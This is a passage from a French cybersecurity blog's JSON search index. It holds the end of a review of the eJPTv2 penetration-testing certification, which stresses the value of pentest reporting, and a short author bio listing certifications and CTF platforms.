recommandations pour les r√©soudre. Il constitue une preuve concr√®te du travail accompli et de la valeur ajout√©e en mati√®re de s√©curit√©.\nDans le contexte professionnel, les clients et les employeurs attendent g√©n√©ralement un rapport d√©taill√© exposant clairement les probl√®mes de s√©curit√© identifi√©s, ainsi que les mesures correctives sugg√©r√©es. Un rapport bien structur√© facilite la compr√©hension des enjeux et permet de prendre des d√©cisions √©clair√©es pour renforcer la posture de s√©curit√©.\nL\u0026rsquo;int√©gration d\u0026rsquo;une section d√©di√©e au reporting dans la certification offrirait aux apprenants l\u0026rsquo;occasion de se familiariser avec la r√©daction de rapports de pentest, un aspect fondamental de la profession de pentester dans la vie r√©elle. Cette inclusion pourrait √©galement renforcer la compr√©hension de l\u0026rsquo;importance de la communication claire et concise des r√©sultats de s√©curit√©.\nMot de Fin # La pr√©paration √† la certification de Ejptv2 exige une approche holistique. Des cours aux CTF en passant par l\u0026rsquo;exp√©rience de l\u0026rsquo;examen, chaque √©l√©ment contribue √† d√©velopper des comp√©tences solides en mati√®re de s√©curit√© informatique. Gardez √† l\u0026rsquo;esprit que la pers√©v√©rance, la pratique et la curiosit√© sont des atouts pr√©cieux dans ce parcours.\nBonne chance dans votre pr√©paration et votre r√©ussite √† la certification !!\n","date":"11 August 2023","externalUrl":null,"permalink":"/posts/ejpt/","section":"Posts","summary":"","title":"Review : eJPTv2 by INE","type":"posts"},{"content":" Whoami # Hello ! Moi c\u0026rsquo;est Anakin, √©tudiant √† l\u0026rsquo;ESNA. Passionn√© de cybers√©curit√© offensive.\nCertifications : OSCP, eJPT, HTB Dante, Zephyr, Offshore.\nMy squad Web site : ü•∑ TheF0rceAwakens\nCTF platformes :\nüíÄ ROOTME ‚òÅÔ∏è TryHackme üü© HackTheBox ","externalUrl":null,"permalink":"/about/","section":"Ani blog","summary":"","title":"","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]